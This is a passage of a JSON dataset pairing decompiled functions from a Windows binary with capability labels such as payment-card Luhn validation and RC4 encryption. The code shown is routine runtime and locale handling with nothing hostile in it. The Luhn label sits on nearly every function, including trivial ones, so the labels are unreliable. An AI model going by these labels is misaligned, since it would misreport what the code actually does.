var_10h = 3;\n            var_eh = var_eh + 0x16d;\n        }\n        uVar5 = fcn.0040b95c();\n        uVar3 = 1;\n        for (; uVar1 = *((uVar5 & 0xff) * 0x18 + 0x4917f6 + uVar3 * 2),  uVar1 <= var_eh; var_eh = var_eh - uVar1) {\n            uVar3 = uVar3 + 1;\n        }\n        *var_4h = iVar6 + iVar2 + var_10h;\n        *var_8h = uVar3;\n        *var_ch = var_eh + 1;\n    }\n    return uVar5;\n}\n",
        "token_count": 605
    },
    "0040bc00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nfloat10 fcn.0040bc00(void)\n\n{\n    double dVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    float10 fVar3;\n    uint uVar4;\n    uint uStack12;\n    \n    fVar3 = fcn.0040ba64();\n    uStack12 = SUB84(fVar3, 0);\n    if (fVar3 < *0x40bc6c) {\n        uVar2 = *(in_EAX + 0xe);\n        fVar3 = fcn.0040b8c0(uVar2);\n        dVar1 = CONCAT44(uStack12, uVar2) - fVar3;\n        uVar4 = SUB84(dVar1, 0);\n        uStack12 = dVar1 >> 0x20;\n    }\n    else {\n        uVar2 = *(in_EAX + 0xe);\n        fVar3 = fcn.0040b8c0(uVar2);\n        dVar1 = fVar3 + CONCAT44(uStack12, uVar2);\n        uVar4 = SUB84(dVar1, 0);\n        uStack12 = dVar1 >> 0x20;\n    }\n    return CONCAT44(uStack12, uVar4);\n}\n",
        "token_count": 277
    },
    "0040bc70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040bc70(uint arg_8h, uint arg_ch)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    fcn.0040b80c(arg_8h, arg_ch);\n    return var_4h % 7 + 1;\n}\n",
        "token_count": 72
    },
    "0040bc98": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nfloat10 fcn.0040bc98(void)\n\n{\n    float10 fVar1;\n    uchar auStack16 [16];\n    \n    sub.kernel32.dll_GetLocalTime(auStack16);\n    fVar1 = fcn.0040ba64();\n    return fVar1;\n}\n",
        "token_count": 62
    },
    "0040bcc4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nfloat10 fcn.0040bcc4(void)\n\n{\n    float10 fVar1;\n    uint16_t uStack6;\n    \n    sub.kernel32.dll_GetLocalTime();\n    fVar1 = fcn.0040b8c0(uStack6);\n    return fVar1;\n}\n",
        "token_count": 63
    },
    "0040bcf8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nfloat10 fcn.0040bcf8(void)\n\n{\n    float10 fVar1;\n    ushort uStack16;\n    uint16_t uStack14;\n    uint uStack12;\n    \n    sub.kernel32.dll_GetLocalTime();\n    fVar1 = fcn.0040ba64();\n    uStack12 = SUB84(fVar1, 0);\n    fVar1 = fcn.0040b8c0(uStack14);\n    return fVar1 + CONCAT44(uStack12, CONCAT22(uStack14, uStack16));\n}\n",
        "token_count": 119
    },
    "0040bd48": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.0040bd48(void)\n\n{\n    uchar auStack16 [16];\n    \n    sub.kernel32.dll_GetLocalTime();\n    return auStack16 & 0xffff;\n}\n",
        "token_count": 43
    },
    "0040bd5c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040bd5c(int32_t arg_8h)\n\n{\n    int32_t in_EDX;\n    int32_t iVar1;\n    \n    iVar1 = 0x100 - *(arg_8h + -0x104);\n    if (in_EDX < iVar1) {\n        iVar1 = in_EDX;\n    }\n    if (iVar1 != 0) {\n        fcn.004030fc();\n    }\n    *(arg_8h + -0x104) = *(arg_8h + -0x104) + iVar1;\n    return;\n}\n",
        "token_count": 130
    },
    "0040bdbc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040bdbc(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_1ch._0_1_ = 0;\n    var_14h._0_1_ = 0;\n    arg_8h_00 = 1;\n    fcn.0040aba0(1, &var_20h, 4);\n    fcn.0040bd5c(arg_8h_00);\n    return;\n}\n",
        "token_count": 152
    },
    "0040c8f8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040c8f8(uint param_1, int32_t param_2)\n\n{\n    uint var_108h;\n    uint var_104h;\n    uint var_100h;\n    \n    if (param_2 == 0) {\n        fcn.0040c140(&stack0xfffffffc);\n    }\n    else {\n        fcn.0040c140(&stack0xfffffffc);\n    }\n    fcn.00405620();\n    return;\n}\n",
        "token_count": 106
    },
    "0040cb6c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0040cb6c(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \n    while( true ) {\n        uVar3 = fcn.0040580c();\n        if ((uVar3 < *param_2) || (cVar1 = *(in_EAX + -1 + *param_2),  uVar3 = cVar1 - 0x3a,  cVar1 - 0x30U < 10))\n        break;\n        uVar3 = *(in_EAX + -1 + *param_2);\n        if ((*((uVar3 >> 3) + 0x491828) >> (uVar3 & 7) & 1) == 0) {\n            *param_2 = *param_2 + 1;\n        }\n        else {\n            iVar2 = fcn.0040e7b0();\n            *param_2 = iVar2;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 247
    },
    "0040d218": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 fcn.0040d218(void)\n\n{\n    char cVar1;\n    double dStack20;\n    \n    cVar1 = fcn.0040d24c();\n    if (cVar1 == '\\0') {\n        fcn.0040976c();\n    }\n    return dStack20;\n}\n",
        "token_count": 69
    },
    "0040d2e8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0040d2e8(void)\n\n{\n    int32_t iVar1;\n    uint uStack292;\n    uint uStack288;\n    uint uStack284;\n    uint uStack276;\n    uchar *puStack272;\n    uint uStack268;\n    uint uStack264;\n    uchar auStack260 [256];\n    \n    uStack264 = 0;\n    uStack268 = 0x100;\n    puStack272 = &stack0xfffffefc;\n    uStack276 = 0;\n    uStack284 = 0;\n    uStack288 = 0x3200;\n    uStack292 = 0x40d30c;\n    for (iVar1 = sub.kernel32.dll_FormatMessageA();\n        (0 < iVar1 && (((&stack0xfffffedf)[iVar1] < 0x21 || ((&stack0xfffffedf)[iVar1] == 0x2e)))); iVar1 = iVar1 + -1)\n    {\n    }\n    uStack292 = 0x40d32c;\n    fcn.00405620();\n    return;\n}\n",
        "token_count": 238
    },
    "0040d334": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get geographical location"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d334(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint lpLCData;\n    \n    iVar1 = sub.kernel32.dll_GetLocaleInfoA_1();\n    if (iVar1 < 1) {\n        fcn.00405584();\n    }\n    else {\n        fcn.00405620();\n    }\n    return;\n}\n",
        "token_count": 84
    },
    "0040d3e8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040d3e8(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    var_ch = 0;\n    var_10h = 0;\n    var_14h = 0;\n    var_18h = 0;\n    uStack48 = 0x40d4fb;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack52;\n    var_4h = sub.kernel32.dll_GetThreadLocale_1();\n    iVar1 = 1;\n    do {\n        fcn.0040d3ac(&var_ch, 0xb, &stack0xfffffffc);\n        fcn.00405584();\n        fcn.0040d3ac(&var_10h, 0xb, &stack0xfffffffc);\n        fcn.00405584();\n        iVar1 = iVar1 + 1;\n    } while (iVar1 != 0xd);\n    iVar1 = 1;\n    do {\n        var_8h = (iVar1 + 5) % 7;\n        fcn.0040d3ac(&var_14h, 6, &stack0xfffffffc);\n        fcn.00405584();\n        fcn.0040d3ac(&var_18h, 6, &stack0xfffffffc);\n        fcn.00405584();\n        iVar1 = iVar1 + 1;\n    } while (iVar1 != 8);\n    *in_FS_OFFSET = uStack52;\n    fcn.00405554(0x40d502);\n    return;\n}\n",
        "token_count": 437
    },
    "0040d5c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0040d5c0(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    code **in_FS_OFFSET;\n    code *in_stack_ffffffc4;\n    code *pcStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack20 = 0x40d657;\n    pcStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &pcStack24;\n    puVar3 = &var_4h;\n    sub.kernel32.dll_GetThreadLocale_1();\n    fcn.0040d334(puVar3);\n    iVar1 = fcn.00409f18();\n    if (iVar1 - 3U < 3) {\n        uVar2 = sub.kernel32.dll_GetThreadLocale_1(iVar1, 4);\n        sub.kernel32.dll_EnumCalendarInfoA(fcn.0040d50c, uVar2);\n        iVar4 = 7;\n        puVar3 = 0x4978f4;\n        do {\n            *puVar3 = 0xffffffff;\n            puVar3 = puVar3 + 1;\n            iVar4 = iVar4 + -1;\n        } while (iVar4 != 0);\n        uVar2 = sub.kernel32.dll_GetThreadLocale_1(iVar1, 3);\n        in_stack_ffffffc4 = fcn.0040d548;\n        sub.kernel32.dll_EnumCalendarInfoA(fcn.0040d548, uVar2);\n    }\n    *in_FS_OFFSET = in_stack_ffffffc4;\n    fcn.00405530(0x40d65e);\n    return;\n}\n",
        "token_count": 402
    },
    "0040d8ac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040d8ac(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t in_EDX;\n    uint var_458h;\n    uint *var_358h;\n    uint var_354h;\n    uint *var_350h;\n    uint var_34ch;\n    int32_t var_348h;\n    uint var_344h;\n    int32_t var_340h;\n    uint var_33ch;\n    uint var_338h;\n    uint var_334h;\n    uint var_330h;\n    int32_t var_32ch;\n    int32_t var_320h;\n    uint var_312h;\n    uint var_212h;\n    uint var_10dh;\n    int32_t var_8h;\n    uint var_4h;\n    \n    sub.kernel32.dll_VirtualQuery_1();\n    if (var_320h == 0x1000) {\n        iVar3 = var_32ch;\n        iVar2 = sub.kernel32.dll_GetModuleFileNameA_1(var_32ch, &var_212h, 0x105);\n        if (iVar2 != 0) {\n            var_8h = in_EDX - var_32ch;\n            goto code_r0x0040d922;\n        }\n    }\n    iVar3 = *0x4977f8;\n    sub.kernel32.dll_GetModuleFileNameA_1();\n    var_8h = fcn.0040d8a0();\ncode_r0x0040d922:\n    fcn.0040ea38(iVar3);\n    fcn.0040a8f4();\n    var_340h = 0x40da2c;\n    var_338h = 0x40da2c;\n    cVar1 = fcn.004047dc();\n    if (cVar1 != '\\0') {\n        var_340h = fcn.004059dc();\n        iVar3 = fcn.0040a868();\n        if ((iVar3 != 0) && (*(var_340h + -1 + iVar3) != '.')) {\n            var_338h = 0x40da30;\n        }\n    }\n    uVar4 = fcn.00406a10(*(*0x494cdc + 4), &var_312h, 0x100);\n    sub.user32.dll_LoadStringA_1(uVar4);\n    fcn.00404530();\n    var_358h = &var_458h;\n    var_354h._0_1_ = 4;\n    var_350h = &var_10dh;\n    var_34ch._0_1_ = 6;\n    var_348h = var_8h;\n    var_344h._0_1_ = 5;\n    var_33ch._0_1_ = 6;\n    var_334h._0_1_ = 6;\n    fcn.0040af58(4, &var_358h);\n    fcn.0040a868();\n    return;\n}\n",
        "token_count": 695
    },
    "0040dafc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040dafc(uint param_1, char param_2)\n\n{\n    uint in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.00405584();\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 128
    },
    "0040db38": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040db38(uint arg_8h, uint arg_ch)\n\n{\n    char in_DL;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h_00;\n    int32_t iStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_4h;\n    \n    var_4h = 0;\n    if (in_DL != '\\0') {\n        puStack40 = 0x40db4c;\n        fcn.00404974();\n    }\n    uStack44 = 0x40db92;\n    iStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    arg_8h_00 = &fcn.0040db38::var_4h;\n    puStack40 = &stack0xfffffffc;\n    fcn.0040af98(arg_8h_00);\n    fcn.00405584();\n    *in_FS_OFFSET = arg_8h_00;\n    uStack44 = 0x40db99;\n    iStack48 = 0x40db91;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 256
    },
    "0040dbb8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040dbb8(uint param_1, char param_2)\n\n{\n    uint in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.00407550();\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 129
    },
    "0040dbf4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040dbf4(uint arg_8h, uint arg_ch)\n\n{\n    char in_DL;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h_00;\n    int32_t iStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    if (in_DL != '\\0') {\n        puStack44 = 0x40dc0a;\n        fcn.00404974();\n    }\n    uStack48 = 0x40dc60;\n    iStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    arg_8h_00 = &fcn.0040dbf4::var_4h;\n    puStack44 = &stack0xfffffffc;\n    fcn.00407550();\n    fcn.0040af98(arg_8h_00);\n    fcn.00405584();\n    *in_FS_OFFSET = arg_8h_00;\n    uStack48 = 0x40dc67;\n    iStack52 = 0x40dc5f;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 273
    },
    "0040dc88": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040dc88(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.00404974();\n        in_DL = extraout_DL;\n    }\n    fcn.00405584();\n    *(in_EAX + 8) = arg_8h;\n    if (in_DL != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 145
    },
    "0040ddcc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0040ddcc(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    uint *arg_ch;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack52 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack56 = 0x40de68;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack60;\n    if (in_EAX == 0) {\n        fcn.00407550();\n    }\n    else {\n        puStack52 = &stack0xfffffffc;\n        fcn.004055c8();\n    }\n    var_1ch = var_4h;\n    var_18h._0_1_ = 0xb;\n    var_10h._0_1_ = 0xb;\n    var_8h._0_1_ = 0;\n    arg_ch = &var_1ch;\n    arg_8h = 2;\n    var_14h = param_2;\n    fcn.00407550();\n    fcn.0040db38(arg_8h, arg_ch);\n    *in_FS_OFFSET = arg_8h;\n    uStack60 = 0x40de6f;\n    fcn.00405530();\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 385
    },
    "0040de88": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040de88(uint arg_8h)\n\n{\n    fcn.0040ddcc();\n    fcn.0040de78();\n    return;\n}\n",
        "token_count": 40
    },
    "0040debc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0040debc(void)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    unkbyte3 Var3;\n    int32_t iVar2;\n    \n    iVar1 = *in_EAX;\n    Var3 = iVar1 >> 8;\n    if (iVar1 < -0x3fffff6d) {\n        iVar2 = iVar1;\n        if (iVar1 == -0x3fffff6e) {\ncode_r0x0040df20:\n            return CONCAT31(iVar2 >> 8, 6);\n        }\n        if (iVar1 < -0x3fffff71) {\n            if (iVar1 == -0x3fffff72) {\n                return CONCAT31(Var3, 7);\n            }\n            if (iVar1 == -0x3ffffffb) {\n                return 0xb;\n            }\n            if (iVar1 == -0x3fffff74) {\n                return 4;\n            }\n            iVar2 = iVar1 + 0x3fffff73;\n            if (iVar2 == 0) goto code_r0x0040df29;\n        }\n        else {\n            iVar2 = iVar1 + 0x3fffff6f;\n            if (iVar1 + 0x3fffff71U < 2) goto code_r0x0040df20;\n            if (iVar2 == 0) {\n                return 8;\n            }\n        }\n    }\n    else if (iVar1 < -0x3fffff69) {\n        if (iVar1 == -0x3fffff6a) {\n            return CONCAT31(Var3, 0xc);\n        }\n        iVar2 = iVar1 + 0x3fffff6d;\n        if (iVar2 == 0) {\ncode_r0x0040df29:\n            return CONCAT31(iVar2 >> 8, 9);\n        }\n        if (iVar1 == -0x3fffff6c) {\n            return 3;\n        }\n        iVar2 = iVar1 + 0x3fffff6b;\n        if (iVar2 == 0) {\n            return 5;\n        }\n    }\n    else {\n        if (iVar1 == -0x3fffff03) {\n            return 0xe;\n        }\n        iVar2 = iVar1 + 0x3ffffec6;\n        if (iVar2 == 0) {\n            return 0xd;\n        }\n    }\n    return CONCAT31(iVar2 >> 8, 0x16);\n}\n",
        "token_count": 550
    },
    "0040e120": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040e120(void)\n\n{\n    char cVar1;\n    uint *in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd4;\n    uint *arg_ch;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint *var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x40e1d9;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    var_4h = in_EAX;\n    uVar2 = fcn.0040debc();\n    uVar2 = uVar2 & 0xff;\n    if (7 < uVar2 - 3) {\n        if (uVar2 == 0xb) {\n            in_stack_ffffffd4 = 0x40e177;\n            iVar3 = fcn.0040df54(&stack0xfffffffc);\n            goto code_r0x0040e1ac;\n        }\n        if (9 < uVar2 - 0xc) {\n            var_ch = *var_4h;\n            var_8h._0_1_ = 0;\n            arg_ch = &fcn.0040e120::var_ch;\n            in_stack_ffffffd4 = 0;\n            fcn.00407550();\n            iVar3 = fcn.0040db38(in_stack_ffffffd4, arg_ch);\n            goto code_r0x0040e1ac;\n        }\n    }\n    iVar3 = fcn.0040dafc();\ncode_r0x0040e1ac:\n    cVar1 = fcn.004047dc();\n    if (cVar1 != '\\0') {\n        *(iVar3 + 0xc) = var_4h;\n    }\n    *in_FS_OFFSET = in_stack_ffffffd4;\n    uStack36 = 0x40e1e0;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 483
    },
    "0040e3a4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get file version info"
        ],
        "decompiled_code": "\nvoid fcn.0040e3a4(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffa0;\n    uint uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint uStack52;\n    uint *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint puLen;\n    int32_t lplpBuffer;\n    uint pBlock;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack40 = 0x40e47a;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    var_8h = 0xffffffff;\n    puStack48 = 0x40e3d1;\n    fcn.004055c8();\n    puStack48 = 0x40e3d9;\n    fcn.00405a34();\n    puStack48 = &fcn.0040e3a4::var_ch;\n    uStack52 = 0x40e3e5;\n    uStack52 = fcn.004059dc();\n    puStack56 = 0x40e3eb;\n    iVar1 = sub.version.dll_GetFileVersionInfoSizeA();\n    if (iVar1 != 0) {\n        puStack56 = 0x40e3f8;\n        pBlock = fcn.00402f00();\n        uStack60 = 0x40e45d;\n        uStack64 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffc0;\n        puStack56 = &stack0xfffffffc;\n        uVar2 = fcn.004059dc(var_ch, iVar1, pBlock);\n        iVar1 = sub.version.dll_GetFileVersionInfoA(uVar2);\n        if (iVar1 != 0) {\n            in_stack_ffffffa0 = pBlock;\n            iVar1 = sub.version.dll_VerQueryValueA(pBlock, 0x40e48c, &fcn.0040e3a4::lplpBuffer, &fcn.0040e3a4::puLen);\n            if (iVar1 != 0) {\n                var_8h = *(lplpBuffer + 8);\n            }\n        }\n        *in_FS_OFFSET = in_stack_ffffffa0;\n        fcn.00402f1c(0x40e464);\n        return;\n    }\n    *in_FS_OFFSET = uStack52;\n    uStack44 = 0x40e481;\n    puStack48 = 0x40e479;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 614
    },
    "0040eaac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040eaac(int32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    uint8_t *puVar2;\n    char cVar3;\n    int32_t iVar4;\n    uint var_1h;\n    \n    sub.kernel32.dll_GetCPInfo(0, arg_8h + -0x14);\n    for (iVar4 = 0; (iVar4 < 0xc && ((*(arg_8h + -0xe + iVar4) | *(arg_8h + -0xd + iVar4)) != 0)); iVar4 = iVar4 + 2) {\n        var_1h._0_1_ = *(arg_8h + -0xe + iVar4);\n        uVar1 = *(arg_8h + -0xd + iVar4);\n        if (var_1h <= uVar1) {\n            cVar3 = (uVar1 - var_1h) + '\\x01';\n            do {\n                puVar2 = (var_1h >> 3) + 0x491828;\n                *puVar2 = *puVar2 | '\\x01' << (var_1h & 7);\n                var_1h._0_1_ = var_1h + 1;\n                cVar3 = cVar3 + -1;\n            } while (cVar3 != '\\0');\n        }\n    }\n    return;\n}\n",
        "token_count": 338
    },
    "0040f234": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040f234(void)\n\n{\n    sub.kernel32.dll_GetModuleFileNameA_1();\n    fcn.00405620();\n    return;\n}\n",
        "token_count": 36
    },
    "0040f278": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040f278(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd0;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x40f303;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack40;\n    if (in_EAX == 0) {\n        iVar1 = fcn.0040dbb8();\n    }\n    else {\n        var_ch._0_1_ = 0;\n        puStack32 = &stack0xfffffffc;\n        fcn.0040d2e8();\n        var_8h = 0;\n        var_4h._0_1_ = 0xb;\n        in_stack_ffffffd0 = 1;\n        iVar1 = fcn.0040dbf4(1, &var_10h);\n    }\n    *(iVar1 + 0xc) = in_EAX;\n    fcn.00404ec4();\n    *in_FS_OFFSET = in_stack_ffffffd0;\n    uStack40 = 0x40f30a;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 332
    },
    "0040f670": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040f670(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.00404620();\n    *(in_EAX + 0xc) = 0xffff;\n    uVar1 = sub.kernel32.dll_CreateEventA(0, 0xffffffff, 0xffffffff, 0);\n    *(in_EAX + 0x10) = uVar1;\n    uVar2 = 0;\n    uVar1 = sub.kernel32.dll_CreateEventA(0, 0, 0, 0);\n    *(in_EAX + 0x14) = uVar1;\n    *(in_EAX + 0x18) = 0xffffffff;\n    uVar1 = fcn.00404620();\n    *(in_EAX + 0x20) = uVar1;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uVar2;\n    }\n    return in_EAX;\n}\n",
        "token_count": 287
    },
    "0040fa10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
